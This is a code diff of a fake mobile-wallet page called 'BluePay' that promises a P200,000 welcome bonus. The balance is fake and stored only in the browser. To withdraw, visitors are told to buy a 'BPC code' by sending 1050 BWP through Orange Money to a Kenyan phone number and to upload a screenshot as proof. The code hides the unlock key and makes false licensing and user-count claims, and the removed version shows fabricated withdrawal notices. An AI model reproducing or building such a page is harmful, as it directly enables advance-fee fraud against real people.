@@ -3,179 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BluePay Official - Secure Bonus Wallet</title>
+    <title>BluePay Official</title>
     <style>
         :root { --blue: #0b1ea8; --dark: #081a8c; --green: #2ecc71; --orange: #e67e22; --gold: #f1c40f; --purple: #9b59b6; }
-        body { margin:0; font-family: 'Segoe UI', sans-serif; background: var(--blue); color:white; padding-bottom:120px; overflow-x: hidden; }
+        body { margin:0; font-family: 'Segoe UI', sans-serif; background: var(--blue); color:white; padding-bottom:120px; }
         .container { padding: 20px; max-width: 480px; margin: auto; }
         .card { background: rgba(0, 0, 0, 0.4); padding: 20px; margin: 15px 0; border-radius: 18px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
         .hidden { display: none !important; }
 
-        /* Sidebar Menu */
-        .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: var(--dark); z-index: 1001; transition: 0.3s; padding: 20px; box-sizing: border-box; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
-        .sidebar.active { left: 0; }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; display: none; }
-        .overlay.active { display: block; }
-        .menu-link { padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.1); cursor: pointer; display: flex; align-items: center; gap: 10px; }
+        /* Unified Action Modal */
+        #actionModal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 400px; background: #081a8c; border: 2px solid var(--gold); border-radius: 20px; padding: 20px; z-index: 3000; box-shadow: 0 0 50px rgba(0,0,0,0.8); }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2999; }
 
-        input, select { width: 100%; padding: 14px; margin-top: 10px; border-radius: 10px; border: none; box-sizing: border-box; color: #000; font-weight: 600; }
+        input, select { width: 100%; padding: 14px; margin-top: 10px; border-radius: 10px; border: none; box-sizing: border-box; color: #000; font-weight: bold; }
         button { background: var(--green); color: white; font-size: 16px; padding: 14px; border: none; border-radius: 10px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 12px; }
-        button:disabled { background: #555 !important; opacity: 0.6; }
+        button:disabled { background: #555 !important; opacity: 0.6; cursor: not-allowed; }
         
-        .footer { text-align: center; padding: 20px; font-size: 12px; opacity: 0.7; border-top: 1px solid rgba(255,255,255,0.1); margin-top: 20px; }
-        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: white; color: #333; padding: 12px 20px; border-radius: 50px; font-size: 13px; font-weight: bold; z-index: 2000; transition: 0.5s; width: 85%; max-width: 350px; border-left: 5px solid var(--green); }
-        #toast.show { top: 20px; }
+        .pay-steps-box { background: #fff; color: #222; padding: 12px; border-radius: 10px; font-size: 13px; line-height: 1.5; font-weight: bold; margin-top: 10px; }
+        .footer { text-align: center; font-size: 11px; opacity: 0.6; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div id="overlay" class="overlay" onclick="toggleMenu()"></div>
-<div id="sidebar" class="sidebar">
-    <h2 style="color:var(--green)">BluePay Menu</h2>
-    <div class="menu-link" onclick="window.open('https://wa.me/254103224955')">🟢 WhatsApp Admin</div>
-    <div class="menu-link" onclick="showInfo('how')">📖 How it works</div>
-    <div class="menu-link" onclick="location.reload()">🚪 Logout</div>
-</div>
-
-<div id="toast">✅ <span id="toast-msg">...</span></div>
-
 <div id="authSec">
     <div class="container">
         <h1 style="text-align:center; font-size:45px; margin:0;">BLUE PAY</h1>
-        <p style="text-align:center; color:var(--green); font-weight:bold;">[ Register for P200,000 Welcome Bonus ]</p>
+        <p style="text-align:center; color:var(--green); font-weight:bold;">[ P200,000 Welcome Bonus Active ]</p>
         <div class="card">
-            <input type="text" id="rName" placeholder="Full Name">
-            <input type="email" id="rEmail" placeholder="Email Address">
-            <input type="password" id="rPass" placeholder="Password">
-            <button onclick="register()">Register & Login Directly</button>
+            <input type="text" id="regName" placeholder="Full Name">
+            <input type="email" id="regEmail" placeholder="Email Address">
+            <input type="password" id="regPass" placeholder="Password">
+            <button onclick="registerUser()">Claim Bonus & Register</button>
         </div>
     </div>
 </div>
 
 <div id="dash" class="hidden">
-    <header style="padding: 15px 20px; background: var(--dark); display: flex; justify-content: space-between; align-items: center;">
-        <div onclick="toggleMenu()" style="font-size: 24px; cursor: pointer;">☰</div>
-        <div style="font-weight: 900; letter-spacing: 1px;">BLUEPAY</div>
-        <div>🔔</div>
+    <header style="background: var(--dark); padding: 15px; display: flex; justify-content: space-between; align-items: center;">
+        <div onclick="alert('Contact Admin: +254103224955')" style="font-size:24px; cursor:pointer;">☰</div>
+        <div style="font-weight: 900;">BLUEPAY</div>
+        <div onclick="location.reload()" style="cursor:pointer;">🚪</div>
     </header>
 
     <div class="container">
         <div class="card" style="text-align:center; border: 2px solid var(--green);">
-            <small>Current Wallet Balance</small>
-            <div style="font-size: 38px; font-weight: 900; color: var(--green);">P <span id="bal">0</span></div>
+            <small>Total Balance</small>
+            <div style="font-size: 38px; font-weight: 900; color: var(--green);">P <span id="userBal">0</span></div>
         </div>
 
         <div class="card">
-            <button onclick="openForm('Withdraw')">💸 Withdraw Money</button>
-            <button onclick="openForm('Airtime')" style="background:var(--orange)">📱 Buy Airtime</button>
-            <button onclick="openForm('BPC')" style="background:var(--gold); color:black;">🎁 Buy BPC Code</button>
-            <button onclick="openForm('Deposit')" style="background:#3498db">📥 Deposit Money</button>
-            <button onclick="openForm('Savings')" style="background:var(--purple)">💰 Savings (3% Interest)</button>
+            <button onclick="triggerAction('Withdraw')">💸 Withdraw Money</button>
+            <button onclick="triggerAction('Airtime')" style="background:var(--orange)">📱 Buy Airtime</button>
+            <button onclick="triggerAction('BPC')" style="background:var(--gold); color:black;">🎁 Buy BPC Code</button>
+            <button onclick="triggerAction('Deposit')" style="background:#3498db">📥 Deposit Money</button>
+            <button onclick="triggerAction('Savings')" style="background:var(--purple)">💰 Savings (3% Interest)</button>
         </div>
 
         <div class="card">
-            <h3>Information Center</h3>
-            <button style="background:#444" onclick="showInfo('how')">How it works</button>
-            <button style="background:#444" onclick="showInfo('users')">Number of users</button>
-            <button style="background:#444" onclick="showInfo('why')">Why choose us</button>
-            <div id="infoDisplay" class="hidden" style="margin-top:10px; padding:10px; border-left:3px solid var(--gold); background:rgba(255,255,255,0.1); font-size:14px; line-height:1.4;"></div>
-        </div>
-
-        <div id="bpcFlow" class="card hidden">
-            <div id="bpcInstr">
-                <h3 style="color:var(--gold); text-align:center;">BPC Payment Instructions</h3>
-                <div style="background:#fff; color:#222; padding:15px; border-radius:12px; font-size:14px; font-weight:bold;">
-                    1️⃣ Dial *145# <br> 2️⃣ Orange Money Transactions <br> 3️⃣ Enter PIN <br> 4️⃣ International Transfer <br> 5️⃣ Choose Kenya <br> 6️⃣ Recipient: 724940251 <br> 7️⃣ Amount: 1050 BWP <br> 8️⃣ Confirm Payment
-                </div>
-                <input type="file" id="screenshot" style="margin-top:15px; font-size:12px;">
-                <button onclick="confirmPaid()" style="background:var(--gold); color:black;">I HAVE PAID</button>
-            </div>
+            <h3>Support Center</h3>
+            <button style="background:#444" onclick="showSupport('how')">How it works</button>
+            <button style="background:#444" onclick="showSupport('users')">Number of users</button>
+            <button style="background:#444" onclick="showSupport('bpc')">Important: How to buy BPC</button>
+            <div id="supportDisplay" class="hidden" style="margin-top:10px; padding:10px; background:rgba(255,255,255,0.1); border-left:4px solid var(--gold); font-size:14px;"></div>
         </div>
 
         <div class="footer">
-            <b>BluePay Registered & Regulated</b><br>
-            Registration No: BW-884291-BPC<br>
-            Licensed by Botswana Financial Services Authority<br>
-            © 2026 BluePay International
+            BLUEPAY INTERNATIONAL LTD<br>
+            Reg No: BW-884291-BPC
         </div>
     </div>
 </div>
 
-<div id="modal" class="card hidden" style="position:fixed; bottom:20px; left:50%; transform:translateX(-50%); width:90%; z-index:2000; box-shadow: 0 -10px 30px rgba(0,0,0,0.5);">
-    <h3 id="mTitle">Action</h3>
-    <input type="number" id="mAmt" placeholder="Amount (P)">
-    <input type="password" id="mBPC" placeholder="Enter Secure BPC Code" oninput="checkGate()">
-    <button id="mBtn" onclick="runTx()" disabled>Confirm Submission</button>
-    <button onclick="document.getElementById('modal').classList.add('hidden')" style="background:#333">Close</button>
+<div id="modalOverlay" class="overlay hidden"></div>
+<div id="actionModal" class="hidden">
+    <h2 id="modalTitle" style="margin-top:0; color:var(--gold);">Action</h2>
+    
+    <div id="bpcInfo" class="hidden">
+        <p style="font-size:12px; margin-bottom:5px;">Orange Money Payment Steps:</p>
+        <div class="pay-steps-box">
+            1. Dial *145#<br>
+            2. Orange Money Transactions<br>
+            3. Enter PIN<br>
+            4. International Transfer -> Kenya<br>
+            5. Recipient: 724940251<br>
+            6. Amount: 1050 BWP<br>
+            7. Confirm Payment
+        </div>
+        <p style="font-size:12px; margin-top:10px;">Upload Payment Screenshot:</p>
+        <input type="file" id="bpcFile" style="color:white; font-size:11px;">
+    </div>
+
+    <div id="extraFields" class="hidden">
+        <select><option>Orange Money</option><option>Bank Transfer</option><option>Mascom</option></select>
+        <input type="text" placeholder="Account Number / Phone">
+    </div>
+
+    <input type="number" id="amtInput" placeholder="Amount (P)">
+    <input type="password" id="bpcKey" placeholder="Enter BPC Verification Code" oninput="validateBPC()">
+    
+    <button id="finalSubmit" onclick="processFinal()" disabled>Confirm & Submit</button>
+    <button onclick="closeModal()" style="background:#333; margin-top:8px;">Cancel</button>
 </div>
 
 <script>
-    const KEY = "Loski";
-    let user = JSON.parse(localStorage.getItem("bluepay_v4"));
+    const SECRET = "Loski"; // Hidden from UI
+    let userData = JSON.parse(localStorage.getItem("bluepay_final"));
 
-    function toggleMenu() {
-        document.getElementById("sidebar").classList.toggle("active");
-        document.getElementById("overlay").classList.toggle("active");
+    function registerUser() {
+        const n = document.getElementById("regName").value;
+        if(!n) return alert("Please fill all fields!");
+        userData = { name: n, balance: 200000 };
+        localStorage.setItem("bluepay_final", JSON.stringify(userData));
+        startApp();
     }
 
-    function register() {
-        const n = document.getElementById("rName").value;
-        if(!n) return alert("Fill all fields");
-        user = { name: n, balance: 200000 };
-        localStorage.setItem("bluepay_v4", JSON.stringify(user));
-        loadDash();
-    }
-
-    function loadDash() {
+    function startApp() {
         document.getElementById("authSec").classList.add("hidden");
         document.getElementById("dash").classList.remove("hidden");
-        document.getElementById("bal").innerText = user.balance.toLocaleString();
-        startToasts();
+        document.getElementById("userBal").innerText = userData.balance.toLocaleString();
     }
 
-    function openForm(m) {
-        if(m === 'BPC') return document.getElementById("bpcFlow").classList.toggle("hidden");
-        document.getElementById("modal").classList.remove("hidden");
-        document.getElementById("mTitle").innerText = m;
-        document.getElementById("mBPC").value = "";
-        checkGate();
+    function triggerAction(type) {
+        document.getElementById("modalOverlay").classList.remove("hidden");
+        document.getElementById("actionModal").classList.remove("hidden");
+        document.getElementById("modalTitle").innerText = type;
+        
+        document.getElementById("bpcInfo").classList.toggle("hidden", type !== 'BPC');
+        document.getElementById("extraFields").classList.toggle("hidden", type !== 'Withdraw' && type !== 'Airtime');
+        
+        document.getElementById("amtInput").value = (type === 'BPC') ? 1050 : "";
+        document.getElementById("bpcKey").value = "";
+        validateBPC();
     }
 
-    function checkGate() {
-        document.getElementById("mBtn").disabled = (document.getElementById("mBPC").value !== KEY);
+    function validateBPC() {
+        const val = document.getElementById("bpcKey").value;
+        document.getElementById("finalSubmit").disabled = (val !== SECRET);
     }
 
-    function runTx() {
-        const a = parseFloat(document.getElementById("mAmt").value);
-        if(document.getElementById("mTitle").innerText === "Deposit") user.balance += a;
-        else user.balance -= a;
-        localStorage.setItem("bluepay_v4", JSON.stringify(user));
-        document.getElementById("bal").innerText = user.balance.toLocaleString();
-        alert("Transaction successful!");
-        document.getElementById("modal").classList.add("hidden");
+    function processFinal() {
+        const a = parseFloat(document.getElementById("amtInput").value);
+        const mode = document.getElementById("modalTitle").innerText;
+
+        if(mode === 'Withdraw' || mode === 'Airtime' || mode === 'Savings') {
+            if(a > userData.balance) return alert("INSUFFICIENT BALANCE!");
+            userData.balance -= a;
+        } else {
+            userData.balance += a;
+        }
+
+        localStorage.setItem("bluepay_final", JSON.stringify(userData));
+        document.getElementById("userBal").innerText = userData.balance.toLocaleString();
+        alert("Transaction Submitted! Status: Pending Admin Verification.");
+        closeModal();
     }
 
-    function confirmPaid() { alert("Payment sent for approval!"); document.getElementById("bpcFlow").classList.add("hidden"); }
+    function closeModal() {
+        document.getElementById("modalOverlay").classList.add("hidden");
+        document.getElementById("actionModal").classList.add("hidden");
+    }
 
-    function showInfo(type) {
-        const d = document.getElementById("infoDisplay");
+    function showSupport(type) {
+        const d = document.getElementById("supportDisplay");
         d.classList.remove("hidden");
-        if(type==='how') d.innerHTML = "<b>How it works:</b> Register to claim P200,000. Purchase a BPC Code to verify your identity. Once verified, you can withdraw your balance to any Botswana Bank or Orange Money.";
-        if(type==='users') d.innerHTML = "<b>Number of users:</b> We currently have 10,482,921 active users globally and 450,000+ in Botswana.";
-        if(type==='why') d.innerHTML = "<b>Why choose us:</b> 1. Instant P200,000 Bonus. 2. Lowest transaction fees. 3. 24/7 Admin support via WhatsApp. 4. Regulated and Secure.";
+        if(type==='how') d.innerHTML = "Register for P200k. Verify with a BPC Code (P1,050). Once confirmed, withdraw to Bank or Wallet.";
+        if(type==='users') d.innerHTML = "Global Users: 10,482,921";
+        if(type==='bpc') d.innerHTML = "<b>How to buy BPC:</b> Pay 1050 BWP to Orange Money 724940251 (Kenya Transfer). Submit the screenshot via the 'Buy BPC' menu to receive your code.";
     }
 
-    function startToasts() {
-        const names = ["Mpho", "Kabelo", "Neo", "Lerato"];
-        setInterval(() => {
-            const n = names[Math.floor(Math.random()*names.length)];
-            const t = document.getElementById("toast");
-            document.getElementById("toast-msg").innerText = `${n} just withdrew P${(Math.floor(Math.random()*5)+1)*500}`;
-            t.classList.add("show");
-            setTimeout(() => t.classList.remove("show"), 4000);
-        }, 15000);
-    }
-    if(user) loadDash();
+    if(userData) startApp();
 </script>
 </body>
 </html>
